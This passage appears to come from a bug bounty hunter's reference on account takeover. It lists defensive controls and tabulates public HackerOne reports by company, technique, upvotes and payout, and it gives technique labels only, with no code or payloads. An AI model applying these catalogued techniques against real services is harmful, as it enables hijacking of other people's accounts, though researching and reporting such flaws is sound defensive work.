- Current password required for password change
- Token expiration and single-use enforcement
- Token binding to user, session, IP, or User-Agent
- Proper OAuth state parameter validation
- PKCE enforcement in OAuth flows
- JWT signature verification with algorithm whitelist
- Secure cookie flags (HttpOnly, Secure, SameSite)
- Session rotation after authentication
- CSRF tokens on sensitive actions
- 2FA enforcement for sensitive operations

## Payout Range: $500 - $35,000

### Known Highest ATO Bounties
| Company | Bounty | Report |
|---------|--------|--------|
| GitLab | $35,000 | #2293343 - Password reset no interaction |
| HackerOne | $20,000 | #745324 - Leaked session cookie |
| TikTok | $12,000 | #2443228 - Auth bypass account recovery |
| Grammarly | $10,500 | #976603 - SSO DOS → ATO |
| Uber | $10,000 | #173551 - Password reset token leaking |
| Chaturbate | $8,000 | #394329 - ATO via billing |
| Uber | $8,000 | #136885 - Complete account takeover |
| LY Corp | $5,000 | #862589 - Spring Actuator → ATO |
| New Relic | $2,048 | #1089467 - Email ID change + forgot password |
| GitLab | $2,450 | #1923672 - SAML RelayState |
| Valve | $2,500 | #407971 - SteamGuard brute force |
| Mail.ru | $1,700 | #744662, #773519 - Password reset |
| InnoGames | $1,100 | #604120 - Chain attack |
| Razer | $750 | #723060 - XSS → ATO |
| Shopify | $800 | #1679734 - Missing email verification |
| Rockstar | $750 | #1442783 - Launcher auth |

## Quick Reference: Top ATO Reports by Upvotes
| Report | Company | Technique | Upvotes | Payout |
|--------|---------|-----------|---------|--------|
| #745324 | HackerOne | Leaked session cookie | 1,624 | $20,000 |
| #2293343 | GitLab | Password reset no interaction | 919 | $35,000 |
| #737140 | Slack | HTTP Request Smuggling | 864 | $0 |
| #129873 | X/xAI | Digits origin validation bypass | 614 | $0 |
| #740037 | LY Corp | Request smuggling | 563 | $0 |
| #1342088 | Flickr | AWS Cognito API | 436 | $0 |
| #563870 | Chrome | CVE-2019-5765 Android | 375 | $0 |
| #1010522 | TikTok | CSRF careers portal | 366 | $0 |
| #905607 | CS Money | Open redirect → ATO | 356 | $0 |
| #2010530 | Yelp | XSS via login keylogger | 321 | $0 |
| #143717 | Uber | Passwordless-signup | 309 | $0 |
| #534450 | Grammarly | Cookie manipulation + XSS | 289 | $0 |
| #723060 | Razer | Reflected XSS → ATO | 287 | $750 |
| #110293 | X/Periscope | OAuth callback validation | 274 | $0 |
| #2831902 | Remitly | 0-Click ATO via password reset | 274 | $0 |
| #876300 | Starbucks | ATO via IDOR | 257 | $0 |
| #976603 | Grammarly | DOS SSO to ATO | 255 | $10,500 |
| #1581240 | Stripe | Mass Account Takeover | 250 | $0 |
| #463330 | Rockstar | CSRF account linking | 237 | $0 |
| #3178999 | HackerOne | SCIM provisioning ATO | 224 | $0 |
